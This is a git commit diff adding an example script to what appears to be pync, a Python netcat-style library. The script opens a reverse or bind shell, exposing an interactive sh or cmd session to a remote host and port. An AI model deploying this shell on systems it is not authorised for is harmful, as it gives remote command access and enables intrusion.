1f6f1fe09317939024cca0bf8f15159c54364ba8
brenw0rth <brenworth0@gmail.com>
2021-11-20 13:13:35 +0000

    merge rshell.py and bshell.py into single script

---
+++ examples/shell.py
@@ -0,0 +1,48 @@
+# -*- coding: utf-8 -*-
+'''
+A simple reverse or bind shell using pync.
+'''
+
+import argparse
+import platform
+
+import pync
+
+
+def main():
+    parser = argparse.ArgumentParser('shell.py',
+            formatter_class=argparse.RawTextHelpFormatter,
+            description=__doc__,
+    )
+    parser.add_argument('host',
+            help='Hostname or IP to connect to',
+            metavar='HOST',
+            nargs='?',
+            default='',
+    )
+    parser.add_argument('port',
+            help='Port number to connect to',
+            metavar='PORT',
+    )
+    parser.add_argument('--listen', '-l',
+            help='Listen mode, for inbound connects',
+            action='store_true',
+    )
+    args = parser.parse_args()
+
+    if platform.system() == 'Windows':
+        command = 'cmd /q'
+    else:
+        command = "PS1='$ ' sh -i"
+
+    mode = pync.connect
+    if args.listen:
+        mode = pync.listen
+
+    with mode(args.host, args.port) as nc:
+        nc.execute(command)
+
+
+if __name__ == '__main__':
+    main()
+
